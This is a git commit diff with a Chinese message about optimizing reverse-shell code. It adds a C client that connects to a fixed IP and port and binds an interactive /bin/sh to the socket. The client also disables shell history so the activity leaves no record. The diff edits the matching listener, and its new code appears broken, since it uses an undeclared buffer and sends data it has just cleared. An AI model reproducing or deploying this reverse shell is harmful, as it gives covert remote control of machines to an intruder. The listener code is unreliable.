a2acaaa4e1b1c3162fe90f3970da926b148cfff7
root <root@localhost.(none)>
2017-05-08 10:29:46 +0800

    优化反弹shell代码

---
+++ client_bak/client.c
@@ -0,0 +1,54 @@
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <stdio.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/shm.h>
+
+char shell[] = "/bin/sh";
+char *argv[] = { shell, "-i", NULL };
+char *envp[] = { "TERM=linux", "PS1=h4x0r-> ", "BASH_HISTORY=/dev/null",
+                 "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/_h4x_","HISTFILE=/dev/null",
+                 "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };
+
+#define MYPORT  8887
+#define BUFFER_SIZE 1024
+
+
+int main()
+{
+    ///定义sockfd
+    int sock_cli = socket(AF_INET,SOCK_STREAM, 0);
+
+    ///定义sockaddr_in
+    struct sockaddr_in servaddr;
+    memset(&servaddr, 0, sizeof(servaddr));
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_port = htons(MYPORT);  ///服务器端口
+    servaddr.sin_addr.s_addr = inet_addr("192.168.189.159");  ///服务器ip
+
+    ///连接服务器，成功返回0，错误返回-1
+    if (connect(sock_cli, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
+    {
+        perror("connect");
+        exit(1);
+    }
+	// send(sock_cli, sendbuf, strlen(sendbuf),0); ///发送
+	// if(strcmp(sendbuf,"exit\n")==0)
+		// break;
+	
+	dup2(sock_cli, 0);
+	dup2(sock_cli, 1);
+	dup2(sock_cli, 2);
+
+	execve(shell, argv, envp);
+	
+	
+
+    close(sock_cli);
+    return 0;
+}
--- client_bak/server.c
+++ client_bak/server.c
@@ -13,8 +13,6 @@
 #define QUEUE   20
 #define BUFFER_SIZE 1024
 
-char console[BUFFER_SIZE] = {0};
-
 int main()
 {
     ///定义sockfd
@@ -41,10 +39,7 @@ int main()
     }
 
     ///客户端套接字
-    char ret[BUFFER_SIZE];
-	char cmd[BUFFER_SIZE];
-	char tmp[BUFFER_SIZE];
-	
+    char buffer[BUFFER_SIZE];
     struct sockaddr_in client_addr;
     socklen_t length = sizeof(client_addr);
 
@@ -56,48 +51,20 @@ int main()
         exit(1);
     }
 
-	
-	
     while(1)
     {
-		int len;
-		if(!strlen(console))
-		{
-			len = recv(conn, console, sizeof(console),0);
-		}
+        memset(buffer,0,sizeof(buffer));
+        int len = recv(conn, buffer, sizeof(buffer),0);
+        if(strcmp(buffer,"exit\n")==0)
+            break;
 		
-		printf("%s", console);
-		memset(cmd,0,sizeof(cmd));
-		/*等待用户输入命令*/
-		while(fgets(cmd, sizeof(cmd), stdin) != NULL)
+		memset(buffer,0,sizeof(buffer));
+		while(fgets(sendbuf, sizeof(sendbuf), stdin) != NULL)
 		{
-			send(conn, cmd, sizeof(cmd), 0);
-			
-			memset(ret,0,sizeof(ret));
-			recv(conn, ret, sizeof(ret),0);
-			break;
+			fputs(buffer, stdout);
+			send(conn, buffer, len, 0);
 		}
-		
-		/*
-		当输入的命令与接收数据相等时，需要再次recv取出命令执行结果和控制台()字符串
-		*/
-		 //printf("ret: %s cmd: %s\n", ret, cmd);
-		 while(strcmp(cmd,"\n") && !strcmp(cmd, ret))
-		 {
-			memset(tmp, 0, sizeof(tmp));
-			len = recv(conn, tmp, sizeof(tmp),0);
-			
-			if(strcmp(console, tmp) == 0)
-			{
-				break;
-			}
-			if(strcmp(ret,"exit\n")==0)
-			{
-				exit(1);
-			}
-			printf("%s", tmp);
-		 }
-		          
+        
     }
     close(conn);
     close(server_sockfd);
